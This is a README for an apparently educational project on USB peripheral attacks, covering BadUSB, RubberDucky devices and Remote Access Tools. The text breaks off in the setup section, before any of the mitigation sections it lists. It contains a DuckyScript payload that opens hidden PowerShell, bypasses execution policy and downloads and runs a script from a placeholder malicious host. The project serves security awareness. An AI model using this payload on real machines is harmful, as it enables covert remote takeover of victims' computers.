# PeripheralAttack
This project demonstrates the vulnerabilities of USB devices by using BadUSB and Remote Access Tools. We transform a USB drive into a RubberDucky, execute an attack to gain remote access, and provide recommendations for prevention and mitigation.
# HACKING THROUGH PERIPHERAL INTERFACES

## Project Description
**Title:** Hacking Through Peripheral Interfaces

**Summary:** This project demonstrates the vulnerabilities of USB devices by using BadUSB and Remote Access Tools (RAT). We transform a USB drive into a RubberDucky, execute an attack to gain remote access, and provide recommendations for prevention and mitigation.

## Table of Contents
- [Introduction](#introduction)
- [Background and Motivation](#background-and-motivation)
- [Implementation](#implementation)
  - [Concepts Used](#concepts-used)
  - [Setup](#setup)
  - [Execution](#execution)
- [Prevention and Mitigation](#prevention-and-mitigation)
  - [User Education](#user-education)
  - [Technical Solutions](#technical-solutions)
- [Conclusion](#conclusion)
- [References](#references)
- [How to Run the Project](#how-to-run-the-project)

## Introduction
**Objective:** 
To demonstrate the concept of BadUSB and Remote Access Tool by setting up a pendrive into a RubberDucky and executing an attack on a victim.

## Background and Motivation
Peripheral interfaces, especially USB devices, present a significant risk if exploited maliciously. This project aims to increase awareness of such vulnerabilities and the necessary precautions to prevent such attacks.

## Implementation

### Concepts Used
- **BadUSB:** BadUSB is a vulnerability that allows USB devices to be reprogrammed and used as malicious devices without the user's knowledge.
- **Remote Access Tool (RAT):** RAT is a type of malware that provides an attacker with remote control of a victim's computer.

### Setup
1. **Setting Up the RubberDucky:**
   - Purchase a USB RubberDucky or create one using a programmable microcontroller.
   - Write a payload script to perform the desired malicious action (e.g., opening a backdoor).
   - Load the payload onto the RubberDucky.

2. **Creating the Payload:**
   ```bash
   REM This is an example payload script
   DELAY 1000
   STRING powershell -w hidden -noni -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')"
   ENTER
